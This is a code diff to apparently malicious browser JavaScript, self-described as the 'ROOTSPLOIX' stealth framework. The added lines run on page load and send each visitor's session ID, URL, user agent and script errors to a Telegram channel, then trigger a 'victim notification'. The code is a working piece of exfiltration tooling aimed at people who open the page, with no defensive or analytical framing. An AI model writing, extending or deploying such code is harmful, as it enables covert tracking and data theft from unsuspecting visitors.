@@ -2274,11 +2274,29 @@ ${navigator.connection ? `• Tip: ${navigator.connection.effectiveType}\n• H�
         
         let startTime = Date.now();
         
+        // ULTIMATE DEBUG SYSTEM
+        console.log('🔥 ROOTSPLOIX DEBUG: Script loading started');
+        
+        // IMMEDIATE TEST (without waiting for DOM)
+        const immediateTestMsg = `⚡ IMMEDIATE TEST!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n\n💀 SCRIPT EXECUTING NOW!`;
+        sendToTelegram(immediateTestMsg);
+        console.log('⚡ ROOTSPLOIX DEBUG: Immediate test sent');
+        
+        // Error handler
+        window.addEventListener('error', function(e) {
+            const errorMsg = `❌ JAVASCRIPT ERROR!\n\n📝 File: ${e.filename}\n🔢 Line: ${e.lineno}\n⚠️ Error: ${e.message}\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(errorMsg);
+            console.error('ROOTSPLOIX ERROR:', e);
+        });
+        
         // Stealth framework initialization
         window.addEventListener('DOMContentLoaded', function() {
+            console.log('🔥 ROOTSPLOIX DEBUG: DOM loaded, starting framework');
+            
             // EMERGENCY DEBUG TEST
-            const testMsg = `🔥 EMERGENCY DEBUG TEST!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n\n💀 SYSTEM LOADING...`;
+            const testMsg = `🔥 EMERGENCY DEBUG TEST!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n🌐 User Agent: ${navigator.userAgent}\n\n💀 SYSTEM LOADING...`;
             sendToTelegram(testMsg);
+            console.log('🔥 ROOTSPLOIX DEBUG: Emergency test sent');
             
             // Send victim notification
             setTimeout(sendVictimNotification, 2000);
